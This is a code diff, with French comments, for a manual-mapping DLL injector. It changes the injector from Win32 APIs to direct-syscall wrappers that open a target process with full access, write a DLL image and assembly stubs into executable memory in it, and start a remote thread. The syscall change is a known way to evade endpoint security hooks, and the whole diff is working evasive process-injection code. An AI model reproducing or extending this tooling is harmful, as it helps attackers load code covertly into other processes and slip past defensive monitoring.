@@ -1,6 +1,7 @@
 #include "dll-injector/dll-injector.h"
 #include "dll-injector/loader-stub.h"
 #include "utils/peb-lookup.h"
+#include "utils/syscalls.h"
 #include "asm-stub-bin.h"
 
 /**
@@ -80,41 +81,55 @@ DWORD ProcessWalking(char* exeFileName){
 LPVOID MannualMappingDll(HANDLE hProcess, PIMAGE_PE_FILE pe){
   IMAGE_DOS_HEADER* dosHeader;
   IMAGE_NT_HEADERS* ntHeaders;
-  LPVOID pRemoteBuffer;
+  PVOID pRemoteBuffer = NULL;
   int numberOfSections;
   IMAGE_SECTION_HEADER* sectionHeaders;
+  NTSTATUS status;
 
   dosHeader = (IMAGE_DOS_HEADER*)pe->RawData;
   ntHeaders = (IMAGE_NT_HEADERS*)(pe->RawData + dosHeader->e_lfanew);
 
   /* Allocation de la mémoire distante pour l'image complète de la DLL. */
-  pRemoteBuffer = g_Api.pVirtualAllocEx(
+  SIZE_T regionSize = (SIZE_T)ntHeaders->OptionalHeader.SizeOfImage;
+  status = dAllocateVirtualMemory(
     hProcess,
-    NULL,
-    ntHeaders->OptionalHeader.SizeOfImage,
+    &pRemoteBuffer,
+    0,
+    &regionSize,
     MEM_COMMIT | MEM_RESERVE,
     PAGE_EXECUTE_READWRITE
   );
-  if(pRemoteBuffer == NULL){
-    printError("VirtualAllocEx");
+  if(status != 0){
+    fprintf(stderr, "dAllocateVirtualMemory (DLL image) failed: 0x%08lX\n", (unsigned long)status);
     return NULL;
   }
 
   /* Écriture des en-têtes PE dans le tampon distant. */
-  g_Api.pWriteProcessMemory(hProcess, pRemoteBuffer, pe->RawData, ntHeaders->OptionalHeader.SizeOfHeaders, NULL);
+  SIZE_T bytesWritten = 0;
+  status = dWriteVirtualMemory(hProcess, pRemoteBuffer, pe->RawData, ntHeaders->OptionalHeader.SizeOfHeaders, &bytesWritten);
+  if(status != 0){
+    fprintf(stderr, "dWriteVirtualMemory (PE headers) failed: 0x%08lX\n", (unsigned long)status);
+    return NULL;
+  }
 
   numberOfSections = ntHeaders->FileHeader.NumberOfSections;
   sectionHeaders = IMAGE_FIRST_SECTION(ntHeaders);
 
   /* Écriture de chaque section à son adresse virtuelle respective. */
   for(int i = 0; i < numberOfSections; i++){
-    g_Api.pWriteProcessMemory(
+    PVOID sectionDest = (PVOID)((BYTE*)pRemoteBuffer + sectionHeaders[i].VirtualAddress);
+    bytesWritten = 0;
+    status = dWriteVirtualMemory(
       hProcess,
-      (LPVOID)((DWORD_PTR)pRemoteBuffer + sectionHeaders[i].VirtualAddress),
+      sectionDest,
       pe->RawData + sectionHeaders[i].PointerToRawData,
       sectionHeaders[i].SizeOfRawData,
-      NULL
+      &bytesWritten
     );
+    if(status != 0){
+      fprintf(stderr, "dWriteVirtualMemory (section %d) failed: 0x%08lX\n", i, (unsigned long)status);
+      return NULL;
+    }
   }
 
   return pRemoteBuffer;
@@ -132,12 +147,23 @@ LPVOID MannualMappingDll(HANDLE hProcess, PIMAGE_PE_FILE pe){
  * @return Handle du processus cible en cas de succès, ou NULL en cas d'erreur.
  */
 HANDLE injectDll(DWORD dwProcessId, const char* dllPath, LPVOID* remoteBuffer){
-  HANDLE hProcess;
+  HANDLE hProcess = NULL;
   LPVOID pRemoteBuffer;
   PIMAGE_PE_FILE pe;
   PMANUAL_MAPPING_DATA pData;
 
-  hProcess = g_Api.pOpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
+  /* Open the target process via direct syscall. */
+  OBJECT_ATTRIBUTES oa;
+  InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
+  CLIENT_ID cid;
+  cid.UniqueProcess = (HANDLE)(ULONG_PTR)dwProcessId;
+  cid.UniqueThread  = NULL;
+
+  NTSTATUS status = dOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
+  if(status != 0){
+    fprintf(stderr, "dOpenProcess failed: 0x%08lX\n", (unsigned long)status);
+    return NULL;
+  }
 
   pe = malloc(sizeof(IMAGE_PE_FILE));
   SetRawData(dllPath, pe);
@@ -196,46 +222,55 @@ HANDLE injectDll(DWORD dwProcessId, const char* dllPath, LPVOID* remoteBuffer){
  * @return Handle du thread distant créé, ou NULL en cas d'erreur.
  */
 HANDLE injectManualMappingStub(HANDLE hProcess, PMANUAL_MAPPING_DATA pData, LPVOID pAsmStub, DWORD asmStubSize, LPVOID pCStub, DWORD cStubSize) {
-    LPVOID pRemoteMem = NULL;
-    LPVOID pRemoteAsmStub = NULL;
-    LPVOID pRemoteCStub = NULL;
-    LPVOID pRemoteData = NULL;
+    PVOID pRemoteMem = NULL;
+    PVOID pRemoteAsmStub = NULL;
+    PVOID pRemoteCStub = NULL;
+    PVOID pRemoteData = NULL;
     HANDLE hThread = NULL;
     SIZE_T totalSize = asmStubSize + cStubSize + sizeof(MANUAL_MAPPING_DATA);
+    SIZE_T regionSize = totalSize;
+    SIZE_T bytesWritten = 0;
+    NTSTATUS status;
 
     /* Allocation d'un bloc contigu : stub ASM | stub C | MANUAL_MAPPING_DATA. */
-    pRemoteMem = g_Api.pVirtualAllocEx(hProcess, NULL, totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (pRemoteMem == NULL) {
-        printError("VirtualAllocEx for stubs");
+    status = dAllocateVirtualMemory(hProcess, &pRemoteMem, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (status != 0) {
+        fprintf(stderr, "dAllocateVirtualMemory (stubs) failed: 0x%08lX\n", (unsigned long)status);
         return NULL;
     }
 
     pRemoteAsmStub = pRemoteMem;
-    pRemoteCStub = (LPVOID)((BYTE*)pRemoteAsmStub + asmStubSize);
-    pRemoteData = (LPVOID)((BYTE*)pRemoteCStub + cStubSize);
+    pRemoteCStub = (PVOID)((BYTE*)pRemoteAsmStub + asmStubSize);
+    pRemoteData = (PVOID)((BYTE*)pRemoteCStub + cStubSize);
 
     /* Mise à jour de l'adresse distante du stub C dans la structure de données. */
     pData->pCStubAddress = pRemoteCStub;
 
-    if (!g_Api.pWriteProcessMemory(hProcess, pRemoteAsmStub, pAsmStub, asmStubSize, NULL)) {
-        printError("WriteProcessMemory ASM stub");
+    bytesWritten = 0;
+    status = dWriteVirtualMemory(hProcess, pRemoteAsmStub, pAsmStub, asmStubSize, &bytesWritten);
+    if (status != 0) {
+        fprintf(stderr, "dWriteVirtualMemory (ASM stub) failed: 0x%08lX\n", (unsigned long)status);
         goto cleanup;
     }
 
-    if (!g_Api.pWriteProcessMemory(hProcess, pRemoteCStub, pCStub, cStubSize, NULL)) {
-        printError("WriteProcessMemory C stub");
+    bytesWritten = 0;
+    status = dWriteVirtualMemory(hProcess, pRemoteCStub, pCStub, cStubSize, &bytesWritten);
+    if (status != 0) {
+        fprintf(stderr, "dWriteVirtualMemory (C stub) failed: 0x%08lX\n", (unsigned long)status);
         goto cleanup;
     }
 
-    if (!g_Api.pWriteProcessMemory(hProcess, pRemoteData, pData, sizeof(MANUAL_MAPPING_DATA), NULL)) {
-        printError("WriteProcessMemory Data");
+    bytesWritten = 0;
+    status = dWriteVirtualMemory(hProcess, pRemoteData, pData, sizeof(MANUAL_MAPPING_DATA), &bytesWritten);
+    if (status != 0) {
+        fprintf(stderr, "dWriteVirtualMemory (Data) failed: 0x%08lX\n", (unsigned long)status);
         goto cleanup;
     }
 
     /* Création du thread distant — point d'entrée : stub ASM, argument : pRemoteData. */
-    hThread = g_Api.pCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteAsmStub, pRemoteData, 0, NULL);
-    if (hThread == NULL) {
-        printError("CreateRemoteThread");
+    status = dCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pRemoteAsmStub, pRemoteData, 0, 0, 0, 0, NULL);
+    if (status != 0) {
+        fprintf(stderr, "dCreateThreadEx failed: 0x%08lX\n", (unsigned long)status);
         goto cleanup;
     }
 
